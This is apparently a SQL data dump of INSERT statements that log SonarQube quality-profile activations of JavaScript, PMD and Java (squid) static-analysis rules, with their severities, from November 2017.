INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (518, '2017-11-16 07:37:04.538', NULL, 'key=js-sonar-security-way-17928:javascript:S1154;ruleKey=javascript:S1154;profileKey=js-sonar-security-way-17928;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn8abbGRdfPp-qk0');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (519, '2017-11-16 07:37:04.551', NULL, 'key=js-sonar-security-way-17928:javascript:WithStatement;ruleKey=javascript:WithStatement;profileKey=js-sonar-security-way-17928;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dwn8nbbGRdfPp-qk1');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (520, '2017-11-16 07:45:57.955', 'admin', 'key=java-egov-qualityprofile-20090:pmd:AssignmentToNonFinalStatic;ruleKey=pmd:AssignmentToNonFinalStatic;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqLDbbGRdfPp-qk3');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1220, '2017-11-20 10:14:43.735', 'admin', 'key=java-lena-qp_15-78480:squid:S1150;ruleKey=squid:S1150;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7EUXbbGRdfPp-qwn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (521, '2017-11-16 07:45:58.068', 'admin', 'key=java-egov-qualityprofile-20090:pmd:AvoidArrayLoops;ruleKey=pmd:AvoidArrayLoops;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqM0bbGRdfPp-qk4');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (522, '2017-11-16 07:45:58.177', 'admin', 'key=java-egov-qualityprofile-20090:pmd:AvoidSynchronizedAtMethodLevel;ruleKey=pmd:AvoidSynchronizedAtMethodLevel;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqOhbbGRdfPp-qk5');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (523, '2017-11-16 07:45:58.252', 'admin', 'key=java-egov-qualityprofile-20090:pmd:ImmutableField;ruleKey=pmd:ImmutableField;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqPsbbGRdfPp-qk6');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (524, '2017-11-16 07:45:58.346', 'admin', 'key=java-egov-qualityprofile-20090:pmd:InefficientEmptyStringCheck;ruleKey=pmd:InefficientEmptyStringCheck;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqRKbbGRdfPp-qk7');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (525, '2017-11-16 07:45:58.425', 'admin', 'key=java-egov-qualityprofile-20090:pmd:InefficientStringBuffering;ruleKey=pmd:InefficientStringBuffering;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqSZbbGRdfPp-qk8');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (526, '2017-11-16 07:45:58.55', 'admin', 'key=java-egov-qualityprofile-20090:pmd:SimpleDateFormatNeedsLocale;ruleKey=pmd:SimpleDateFormatNeedsLocale;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqUWbbGRdfPp-qk9');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (527, '2017-11-16 07:45:58.666', 'admin', 'key=java-egov-qualityprofile-20090:pmd:StringInstantiation;ruleKey=pmd:StringInstantiation;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqWKbbGRdfPp-qk-');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (528, '2017-11-16 07:45:58.776', 'admin', 'key=java-egov-qualityprofile-20090:squid:AssignmentInSubExpressionCheck;ruleKey=squid:AssignmentInSubExpressionCheck;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqX4bbGRdfPp-qk_');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (529, '2017-11-16 07:45:58.883', 'admin', 'key=java-egov-qualityprofile-20090:squid:EmptyStatementUsageCheck;ruleKey=squid:EmptyStatementUsageCheck;profileKey=java-egov-qualityprofile-20090;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqZjbbGRdfPp-qlA');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (530, '2017-11-16 07:45:58.965', 'admin', 'key=java-egov-qualityprofile-20090:squid:S00108;ruleKey=squid:S00108;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dyqa1bbGRdfPp-qlB');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (531, '2017-11-16 07:45:59.026', 'admin', 'key=java-egov-qualityprofile-20090:squid:S00112;ruleKey=squid:S00112;profileKey=java-egov-qualityprofile-20090;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqbybbGRdfPp-qlC');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (532, '2017-11-16 07:45:59.094', 'admin', 'key=java-egov-qualityprofile-20090:squid:S00115;ruleKey=squid:S00115;profileKey=java-egov-qualityprofile-20090;param_format=^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dyqc2bbGRdfPp-qlD');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (533, '2017-11-16 07:45:59.179', 'admin', 'key=java-egov-qualityprofile-20090:squid:S00116;ruleKey=squid:S00116;profileKey=java-egov-qualityprofile-20090;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqeKbbGRdfPp-qlE');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (534, '2017-11-16 07:45:59.266', 'admin', 'key=java-egov-qualityprofile-20090:squid:S00117;ruleKey=squid:S00117;profileKey=java-egov-qualityprofile-20090;param_format=^[a-z][a-zA-Z0-9]*$;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqfibbGRdfPp-qlF');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (535, '2017-11-16 07:45:59.46', 'admin', 'key=java-egov-qualityprofile-20090:squid:S00121;ruleKey=squid:S00121;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqikbbGRdfPp-qlG');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (536, '2017-11-16 07:45:59.569', 'admin', 'key=java-egov-qualityprofile-20090:squid:S106;ruleKey=squid:S106;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqkRbbGRdfPp-qlH');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (537, '2017-11-16 07:45:59.755', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1068;ruleKey=squid:S1068;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqnLbbGRdfPp-qlI');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (538, '2017-11-16 07:45:59.908', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1125;ruleKey=squid:S1125;profileKey=java-egov-qualityprofile-20090;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqpkbbGRdfPp-qlJ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (539, '2017-11-16 07:45:59.965', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1153;ruleKey=squid:S1153;profileKey=java-egov-qualityprofile-20090;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqqdbbGRdfPp-qlK');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (540, '2017-11-16 07:46:00.015', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1158;ruleKey=squid:S1158;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqrPbbGRdfPp-qlL');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (541, '2017-11-16 07:46:00.088', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1170;ruleKey=squid:S1170;profileKey=java-egov-qualityprofile-20090;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqsYbbGRdfPp-qlM');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (542, '2017-11-16 07:46:00.15', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1172;ruleKey=squid:S1172;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqtWbbGRdfPp-qlN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (543, '2017-11-16 07:46:00.221', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1186;ruleKey=squid:S1186;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqudbbGRdfPp-qlO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (544, '2017-11-16 07:46:00.294', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1214;ruleKey=squid:S1214;profileKey=java-egov-qualityprofile-20090;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqvmbbGRdfPp-qlP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (545, '2017-11-16 07:46:00.363', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1226;ruleKey=squid:S1226;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqwrbbGRdfPp-qlQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (546, '2017-11-16 07:46:00.441', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1694;ruleKey=squid:S1694;profileKey=java-egov-qualityprofile-20090;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dyqx5bbGRdfPp-qlR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (547, '2017-11-16 07:46:00.489', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1695;ruleKey=squid:S1695;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqypbbGRdfPp-qlS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (548, '2017-11-16 07:46:00.529', 'admin', 'key=java-egov-qualityprofile-20090:squid:S1858;ruleKey=squid:S1858;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_DyqzRbbGRdfPp-qlT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (549, '2017-11-16 07:46:00.596', 'admin', 'key=java-egov-qualityprofile-20090:squid:S2159;ruleKey=squid:S2159;profileKey=java-egov-qualityprofile-20090;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dyq0UbbGRdfPp-qlU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (550, '2017-11-16 07:46:00.658', 'admin', 'key=java-egov-qualityprofile-20090:squid:SwitchLastCaseIsDefaultCheck;ruleKey=squid:SwitchLastCaseIsDefaultCheck;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dyq1SbbGRdfPp-qlV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (551, '2017-11-16 07:46:00.704', 'admin', 'key=java-egov-qualityprofile-20090:squid:UnusedPrivateMethod;ruleKey=squid:UnusedPrivateMethod;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dyq2AbbGRdfPp-qlW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (552, '2017-11-16 07:46:00.748', 'admin', 'key=java-egov-qualityprofile-20090:squid:UselessImportCheck;ruleKey=squid:UselessImportCheck;profileKey=java-egov-qualityprofile-20090;severity=MINOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dyq2sbbGRdfPp-qlX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (553, '2017-11-16 07:46:00.817', 'admin', 'key=java-egov-qualityprofile-20090:squid:UselessParenthesesCheck;ruleKey=squid:UselessParenthesesCheck;profileKey=java-egov-qualityprofile-20090;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Dyq3xbbGRdfPp-qlY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (581, '2017-11-20 07:13:48.29', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2688;ruleKey=javascript:S2688;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqECbbGRdfPp-qmo');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (554, '2017-11-20 07:13:46.795', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:ArrayAndObjectConstructors;ruleKey=javascript:ArrayAndObjectConstructors;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRpsrbbGRdfPp-qmN');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (555, '2017-11-20 07:13:46.847', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:AssignmentWithinCondition;ruleKey=javascript:AssignmentWithinCondition;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRptfbbGRdfPp-qmO');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (556, '2017-11-20 07:13:46.902', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:BoundOrAssignedEvalOrArguments;ruleKey=javascript:BoundOrAssignedEvalOrArguments;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRpuWbbGRdfPp-qmP');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (557, '2017-11-20 07:13:46.943', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:DebuggerStatement;ruleKey=javascript:DebuggerStatement;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRpu_bbGRdfPp-qmQ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (558, '2017-11-20 07:13:46.983', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:DuplicateFunctionArgument;ruleKey=javascript:DuplicateFunctionArgument;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRpvnbbGRdfPp-qmR');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (559, '2017-11-20 07:13:47.03', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:DuplicatePropertyName;ruleKey=javascript:DuplicatePropertyName;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRpwWbbGRdfPp-qmS');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (560, '2017-11-20 07:13:47.067', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:EmptyBlock;ruleKey=javascript:EmptyBlock;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRpw7bbGRdfPp-qmT');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (561, '2017-11-20 07:13:47.173', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:Eval;ruleKey=javascript:Eval;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRpylbbGRdfPp-qmU');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (562, '2017-11-20 07:13:47.229', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:ForIn;ruleKey=javascript:ForIn;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRpzdbbGRdfPp-qmV');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (563, '2017-11-20 07:13:47.281', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:FunctionDefinitionInsideLoop;ruleKey=javascript:FunctionDefinitionInsideLoop;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp0RbbGRdfPp-qmW');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (564, '2017-11-20 07:13:47.34', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:HtmlComments;ruleKey=javascript:HtmlComments;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp1MbbGRdfPp-qmX');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (565, '2017-11-20 07:13:47.384', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S1154;ruleKey=javascript:S1154;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp14bbGRdfPp-qmY');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (566, '2017-11-20 07:13:47.412', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S1442;ruleKey=javascript:S1442;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp2UbbGRdfPp-qmZ');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (567, '2017-11-20 07:13:47.456', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S1656;ruleKey=javascript:S1656;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp3AbbGRdfPp-qma');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (568, '2017-11-20 07:13:47.494', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S1697;ruleKey=javascript:S1697;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp3mbbGRdfPp-qmb');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (569, '2017-11-20 07:13:47.545', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S1764;ruleKey=javascript:S1764;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp4ZbbGRdfPp-qmc');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (570, '2017-11-20 07:13:47.616', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S1788;ruleKey=javascript:S1788;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp5gbbGRdfPp-qmd');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (571, '2017-11-20 07:13:47.673', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S1854;ruleKey=javascript:S1854;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp6ZbbGRdfPp-qme');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (572, '2017-11-20 07:13:47.717', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S1862;ruleKey=javascript:S1862;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp7FbbGRdfPp-qmf');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (573, '2017-11-20 07:13:47.803', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S1871;ruleKey=javascript:S1871;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp8abbGRdfPp-qmg');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (574, '2017-11-20 07:13:47.891', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S1994;ruleKey=javascript:S1994;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp9zbbGRdfPp-qmh');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (575, '2017-11-20 07:13:47.975', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2123;ruleKey=javascript:S2123;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRp_HbbGRdfPp-qmi');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (576, '2017-11-20 07:13:48.059', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2228;ruleKey=javascript:S2228;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqAbbbGRdfPp-qmj');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (577, '2017-11-20 07:13:48.108', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2234;ruleKey=javascript:S2234;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqBMbbGRdfPp-qmk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (578, '2017-11-20 07:13:48.142', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2251;ruleKey=javascript:S2251;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=BLOCKER', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqBubbGRdfPp-qml');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (579, '2017-11-20 07:13:48.199', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2432;ruleKey=javascript:S2432;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqCnbbGRdfPp-qmm');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (580, '2017-11-20 07:13:48.23', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2681;ruleKey=javascript:S2681;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqDGbbGRdfPp-qmn');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (1217, '2017-11-20 10:14:43.631', 'admin', 'key=java-lena-qp_15-78480:squid:S1143;ruleKey=squid:S1143;profileKey=java-lena-qp_15-78480;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_Y7ESvbbGRdfPp-qwk');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (582, '2017-11-20 07:13:48.326', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2814;ruleKey=javascript:S2814;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=MAJOR', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqEmbbGRdfPp-qmp');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (583, '2017-11-20 07:13:48.389', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2870;ruleKey=javascript:S2870;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqFlbbGRdfPp-qmq');
INSERT INTO activities (id, created_at, user_login, data_field, log_type, log_action, log_message, log_key) VALUES (584, '2017-11-20 07:13:48.422', 'admin', 'key=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368:javascript:S2990;ruleKey=javascript:S2990;profileKey=js-cb80d362-ba5b-4e40-8dbb-f4adb2124c21-lena-qp_10-35368;severity=CRITICAL', 'QPROFILE', 'ACTIVATED', NULL, 'AV_YRqGGbbGRdfPp-qmr');
